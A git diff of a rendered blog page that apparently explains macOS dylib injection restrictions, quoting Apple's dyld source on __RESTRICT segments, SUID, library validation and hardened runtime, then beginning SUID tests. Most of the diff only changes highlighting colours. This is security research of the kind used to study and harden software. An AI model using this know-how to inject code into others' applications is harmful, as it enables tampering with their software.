+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">uint32_t</span> cmd_count <span style="color:#555">=</span> mh<span style="color:#555">-&gt;</span>ncmds;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span> <span style="color:#069;font-weight:bold">const</span> cmds <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span>)(((<span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span>)mh)<span style="color:#555">+</span><span style="color:#069;font-weight:bold">sizeof</span>(macho_header));
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span> cmd <span style="color:#555">=</span> cmds;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">uint32_t</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> cmd_count; <span style="color:#555">++</span>i) {
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">switch</span> (cmd<span style="color:#555">-&gt;</span>cmd) {
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">LC_SEGMENT_COMMAND</span>:
 </span></span><span style="display:flex;"><span>			{
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> macho_segment_command<span style="color:#f92672">*</span> seg <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> macho_segment_command<span style="color:#f92672">*</span>)cmd;
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_segment_command<span style="color:#555">*</span> seg <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">struct</span> macho_segment_command<span style="color:#555">*</span>)cmd;
 </span></span><span style="display:flex;"><span>				
-</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//dyld::log(&#34;seg name: %s\n&#34;, seg-&gt;segname);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(seg<span style="color:#f92672">-&gt;</span>segname, <span style="color:#e6db74">&#34;__RESTRICT&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> macho_section<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> sectionsStart <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> macho_section<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)seg <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> macho_segment_command));
-</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> macho_section<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> sectionsEnd <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>sectionsStart[seg<span style="color:#f92672">-&gt;</span>nsects];
-</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> macho_section<span style="color:#f92672">*</span> sect<span style="color:#f92672">=</span>sectionsStart; sect <span style="color:#f92672">&lt;</span> sectionsEnd; <span style="color:#f92672">++</span>sect) {
-</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(sect<span style="color:#f92672">-&gt;</span>sectname, <span style="color:#e6db74">&#34;__restrict&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) 
-</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>				<span style="color:#09f;font-style:italic">//dyld::log(&#34;seg name: %s\n&#34;, seg-&gt;segname);
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>				<span style="color:#069;font-weight:bold">if</span> (<span style="color:#c0f">strcmp</span>(seg<span style="color:#555">-&gt;</span>segname, <span style="color:#c30">&#34;__RESTRICT&#34;</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span> <span style="color:#069;font-weight:bold">const</span> sectionsStart <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span>)seg <span style="color:#555">+</span> <span style="color:#069;font-weight:bold">sizeof</span>(<span style="color:#069;font-weight:bold">struct</span> macho_segment_command));
+</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span> <span style="color:#069;font-weight:bold">const</span> sectionsEnd <span style="color:#555">=</span> <span style="color:#555">&amp;</span>sectionsStart[seg<span style="color:#555">-&gt;</span>nsects];
+</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span> sect<span style="color:#555">=</span>sectionsStart; sect <span style="color:#555">&lt;</span> sectionsEnd; <span style="color:#555">++</span>sect) {
+</span></span><span style="display:flex;"><span>						<span style="color:#069;font-weight:bold">if</span> (<span style="color:#c0f">strcmp</span>(sect<span style="color:#555">-&gt;</span>sectname, <span style="color:#c30">&#34;__restrict&#34;</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) 
+</span></span><span style="display:flex;"><span>							<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>					}
 </span></span><span style="display:flex;"><span>				}
 </span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		cmd <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> load_command<span style="color:#f92672">*</span>)(((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)cmd)<span style="color:#f92672">+</span>cmd<span style="color:#f92672">-&gt;</span>cmdsize);
+</span></span><span style="display:flex;"><span>		cmd <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span>)(((<span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span>)cmd)<span style="color:#555">+</span>cmd<span style="color:#555">-&gt;</span>cmdsize);
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">false</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span><span style="display:flex;"><span><span style="color:#099">#endif
 </span></span></span></code></pre></div><p>Now, the above is the old source code, that was referred in the article above - since then it has evolved. The latest available code is <a href="https://opensource.apple.com/source/dyld/dyld-635.2/src/dyld.cpp.auto.html"  class="external-link" target="_blank" rel="noopener">dyld.cpp</a> looks slightly more complicated,  but essentially the same idea.  Here is the relevant code segment, that sets the restriction, and the one that returns it (<code>configureProcessRestrictions , processIsRestricted </code>):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">configureProcessRestrictions</span>(<span style="color:#66d9ef">const</span> macho_header<span style="color:#f92672">*</span> mainExecutableMH)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">configureProcessRestrictions</span>(<span style="color:#069;font-weight:bold">const</span> macho_header<span style="color:#555">*</span> mainExecutableMH)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> amfiInputFlags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#if TARGET_IPHONE_SIMULATOR
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	amfiInputFlags <span style="color:#f92672">|=</span> AMFI_DYLD_INPUT_PROC_IN_SIMULATOR;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#elif __MAC_OS_X_VERSION_MIN_REQUIRED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">hasRestrictedSegment</span>(mainExecutableMH) )
-</span></span><span style="display:flex;"><span>		amfiInputFlags <span style="color:#f92672">|=</span> AMFI_DYLD_INPUT_PROC_HAS_RESTRICT_SEG;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#elif __IPHONE_OS_VERSION_MIN_REQUIRED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">isFairPlayEncrypted</span>(mainExecutableMH) )
-</span></span><span style="display:flex;"><span>		amfiInputFlags <span style="color:#f92672">|=</span> AMFI_DYLD_INPUT_PROC_IS_ENCRYPTED;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">uint64_t</span> amfiOutputFlags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">amfi_check_dyld_policy_self</span>(amfiInputFlags, <span style="color:#f92672">&amp;</span>amfiOutputFlags) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ) {
-</span></span><span style="display:flex;"><span>		gLinkContext.allowAtPaths 				<span style="color:#f92672">=</span> (amfiOutputFlags <span style="color:#f92672">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_AT_PATH);
-</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPrint			<span style="color:#f92672">=</span> (amfiOutputFlags <span style="color:#f92672">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS);
-</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPath			<span style="color:#f92672">=</span> (amfiOutputFlags <span style="color:#f92672">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS);
-</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsSharedCache	<span style="color:#f92672">=</span> (amfiOutputFlags <span style="color:#f92672">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE);
-</span></span><span style="display:flex;"><span>		gLinkContext.allowClassicFallbackPaths	<span style="color:#f92672">=</span> (amfiOutputFlags <span style="color:#f92672">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS);
-</span></span><span style="display:flex;"><span>		gLinkContext.allowInsertFailures    	<span style="color:#f92672">=</span> (amfiOutputFlags <span style="color:#f92672">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION);
+</span></span><span style="display:flex;"><span>	<span style="color:#078;font-weight:bold">uint64_t</span> amfiInputFlags <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#099">#if TARGET_IPHONE_SIMULATOR
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	amfiInputFlags <span style="color:#555">|=</span> AMFI_DYLD_INPUT_PROC_IN_SIMULATOR;
+</span></span><span style="display:flex;"><span><span style="color:#099">#elif __MAC_OS_X_VERSION_MIN_REQUIRED
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">hasRestrictedSegment</span>(mainExecutableMH) )
+</span></span><span style="display:flex;"><span>		amfiInputFlags <span style="color:#555">|=</span> AMFI_DYLD_INPUT_PROC_HAS_RESTRICT_SEG;
+</span></span><span style="display:flex;"><span><span style="color:#099">#elif __IPHONE_OS_VERSION_MIN_REQUIRED
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">isFairPlayEncrypted</span>(mainExecutableMH) )
+</span></span><span style="display:flex;"><span>		amfiInputFlags <span style="color:#555">|=</span> AMFI_DYLD_INPUT_PROC_IS_ENCRYPTED;
+</span></span><span style="display:flex;"><span><span style="color:#099">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#078;font-weight:bold">uint64_t</span> amfiOutputFlags <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">amfi_check_dyld_policy_self</span>(amfiInputFlags, <span style="color:#555">&amp;</span>amfiOutputFlags) <span style="color:#555">==</span> <span style="color:#f60">0</span> ) {
+</span></span><span style="display:flex;"><span>		gLinkContext.allowAtPaths 				<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_AT_PATH);
+</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPrint			<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS);
+</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPath			<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS);
+</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsSharedCache	<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE);
+</span></span><span style="display:flex;"><span>		gLinkContext.allowClassicFallbackPaths	<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS);
+</span></span><span style="display:flex;"><span>		gLinkContext.allowInsertFailures    	<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION);
 </span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#if __MAC_OS_X_VERSION_MIN_REQUIRED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// support chrooting from old kernel
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">bool</span> isRestricted <span style="color:#f92672">=</span> false;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">bool</span> libraryValidation <span style="color:#f92672">=</span> false;
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// any processes with setuid or setgid bit set or with __RESTRICT segment is restricted
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">issetugid</span>() <span style="color:#f92672">||</span> <span style="color:#a6e22e">hasRestrictedSegment</span>(mainExecutableMH) ) {
-</span></span><span style="display:flex;"><span>			isRestricted <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>		<span style="color:#09f;font-style:italic">// support chrooting from old kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		<span style="color:#078;font-weight:bold">bool</span> isRestricted <span style="color:#555">=</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">bool</span> libraryValidation <span style="color:#555">=</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">// any processes with setuid or setgid bit set or with __RESTRICT segment is restricted
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">issetugid</span>() <span style="color:#555">||</span> <span style="color:#c0f">hasRestrictedSegment</span>(mainExecutableMH) ) {
+</span></span><span style="display:flex;"><span>			isRestricted <span style="color:#555">=</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">bool</span> usingSIP <span style="color:#f92672">=</span> (<span style="color:#a6e22e">csr_check</span>(CSR_ALLOW_TASK_FOR_PID) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">uint32_t</span> flags;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">csops</span>(<span style="color:#ae81ff">0</span>, CS_OPS_STATUS, <span style="color:#f92672">&amp;</span>flags, <span style="color:#66d9ef">sizeof</span>(flags)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ) {
-</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// On OS X CS_RESTRICT means the program was signed with entitlements
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> ( ((flags <span style="color:#f92672">&amp;</span> CS_RESTRICT) <span style="color:#f92672">==</span> CS_RESTRICT) <span style="color:#f92672">&amp;&amp;</span> usingSIP ) {
-</span></span><span style="display:flex;"><span>				isRestricted <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">bool</span> usingSIP <span style="color:#555">=</span> (<span style="color:#c0f">csr_check</span>(CSR_ALLOW_TASK_FOR_PID) <span style="color:#555">!=</span> <span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">uint32_t</span> flags;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">csops</span>(<span style="color:#f60">0</span>, CS_OPS_STATUS, <span style="color:#555">&amp;</span>flags, <span style="color:#069;font-weight:bold">sizeof</span>(flags)) <span style="color:#555">!=</span> <span style="color:#555">-</span><span style="color:#f60">1</span> ) {
+</span></span><span style="display:flex;"><span>			<span style="color:#09f;font-style:italic">// On OS X CS_RESTRICT means the program was signed with entitlements
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>			<span style="color:#069;font-weight:bold">if</span> ( ((flags <span style="color:#555">&amp;</span> CS_RESTRICT) <span style="color:#555">==</span> CS_RESTRICT) <span style="color:#555">&amp;&amp;</span> usingSIP ) {
+</span></span><span style="display:flex;"><span>				isRestricted <span style="color:#555">=</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>			}
-</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Library Validation loosens searching but requires everything to be code signed
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> ( flags <span style="color:#f92672">&amp;</span> CS_REQUIRE_LV ) {
-</span></span><span style="display:flex;"><span>				isRestricted <span style="color:#f92672">=</span> false;
-</span></span><span style="display:flex;"><span>				libraryValidation <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>			<span style="color:#09f;font-style:italic">// Library Validation loosens searching but requires everything to be code signed
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>			<span style="color:#069;font-weight:bold">if</span> ( flags <span style="color:#555">&amp;</span> CS_REQUIRE_LV ) {
+</span></span><span style="display:flex;"><span>				isRestricted <span style="color:#555">=</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span>				libraryValidation <span style="color:#555">=</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>			}
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		gLinkContext.allowAtPaths                <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>isRestricted;
-</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPrint           <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>isRestricted;
-</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPath            <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>isRestricted;
-</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsSharedCache     <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>libraryValidation <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>usingSIP;
-</span></span><span style="display:flex;"><span>		gLinkContext.allowClassicFallbackPaths   <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>isRestricted;
-</span></span><span style="display:flex;"><span>		gLinkContext.allowInsertFailures         <span style="color:#f92672">=</span> false;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">halt</span>(<span style="color:#e6db74">&#34;amfi_check_dyld_policy_self() failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span><span style="display:flex;"><span>		gLinkContext.allowAtPaths                <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
+</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPrint           <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
+</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPath            <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
+</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsSharedCache     <span style="color:#555">=</span> <span style="color:#555">!</span>libraryValidation <span style="color:#555">||</span> <span style="color:#555">!</span>usingSIP;
+</span></span><span style="display:flex;"><span>		gLinkContext.allowClassicFallbackPaths   <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
+</span></span><span style="display:flex;"><span>		gLinkContext.allowInsertFailures         <span style="color:#555">=</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span><span style="color:#099">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>		<span style="color:#c0f">halt</span>(<span style="color:#c30">&#34;amfi_check_dyld_policy_self() failed</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#099">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	}
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">processIsRestricted</span>()
+</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">bool</span> <span style="color:#c0f">processIsRestricted</span>()
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#if __MAC_OS_X_VERSION_MIN_REQUIRED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>gLinkContext.allowEnvVarsPath;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> false;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#555">!</span>gLinkContext.allowEnvVarsPath;
+</span></span><span style="display:flex;"><span><span style="color:#099">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span><span style="color:#099">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>}
 </span></span></code></pre></div><p>It will set the <code>gLinkContext.allowEnvVarsPath</code> to false if:</p>
 <ol>
 <li>The main executable has restricted segment</li>
@@ -438,35 +438,35 @@ And a few similar ones, and I will be honest, I had no idea what is he talking a
 <p>But! It’s unset if <code>CS_REQUIRE_LV</code> is set. What this flag does? If it’s set for the main binary, it means that the loader will verify every single dylib loaded into the application, if they were signed with the same key as the main executable. If we think about this it kinda makes sense, as you can only inject a dylib to the application that was developed by the same person. You can only abuse this if you have access to that code signing certificate - or not, more on that later ;).</p>
 <p>There is another option to protect the application, and it’s enabling <a href="https://developer.apple.com/documentation/security/hardened_runtime_entitlements"  class="external-link" target="_blank" rel="noopener">Hardened Runtime</a>. Then if you want, you can specifically enable DYLD environment variables: <a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_security_cs_allow-dyld-environment-variables"  class="external-link" target="_blank" rel="noopener">Allow DYLD Environment Variables Entitlement - Entitlements</a>. The above source code seems to be dated back to 2013, and this option is only available since Mojave (10.14), which was released last year (2018), probably this is why we don’t see anything about this in the source code.</p>
 <p>For the record, these are the values of the CS flags, taken from <a href="https://opensource.apple.com/source/xnu/xnu-4903.221.2/osfmk/kern/cs_blobs.h.auto.html"  class="external-link" target="_blank" rel="noopener">cs_blobs.h</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define CS_RESTRICT		0x0000800	</span><span style="color:#75715e">/* tell dyld to treat restricted */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CS_REQUIRE_LV		0x0002000	</span><span style="color:#75715e">/* require library validation */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CS_RUNTIME		0x00010000  </span><span style="color:#75715e">/* Apply hardened runtime policies */</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#define CS_RESTRICT		0x0000800	</span><span style="color:#09f;font-style:italic">/* tell dyld to treat restricted */</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#define CS_REQUIRE_LV		0x0002000	</span><span style="color:#09f;font-style:italic">/* require library validation */</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#define CS_RUNTIME		0x00010000  </span><span style="color:#09f;font-style:italic">/* Apply hardened runtime policies */</span><span style="color:#099">
 </span></span></span></code></pre></div><p>This was the theory, let’s see all of these in practice, if they indeed work as advertised. I will create an Xcode project and modify the configuration as needed. Before that we can use our original code for the SUID bit testing, and as we can see it works as expected:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#setting ownership</span>
-</span></span><span style="display:flex;"><span>$ sudo chown root test
-</span></span><span style="display:flex;"><span>$ ls -l test
-</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root  staff  <span style="color:#ae81ff">8432</span> Jul  <span style="color:#ae81ff">8</span> 16:46 test
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#setting ownership</span>
+</span></span><span style="display:flex;"><span>$ sudo chown root <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">8432</span> Jul  <span style="color:#f60">8</span> 16:46 <span style="color:#366">test</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#setting suid flag, and running, as we can see the dylib is not run</span>
-</span></span><span style="display:flex;"><span>$ sudo chmod +s test
-</span></span><span style="display:flex;"><span>$ ls -l test
-</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#ae81ff">1</span> root  staff  <span style="color:#ae81ff">8432</span> Jul  <span style="color:#ae81ff">8</span> 16:46 test
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#setting suid flag, and running, as we can see the dylib is not run</span>
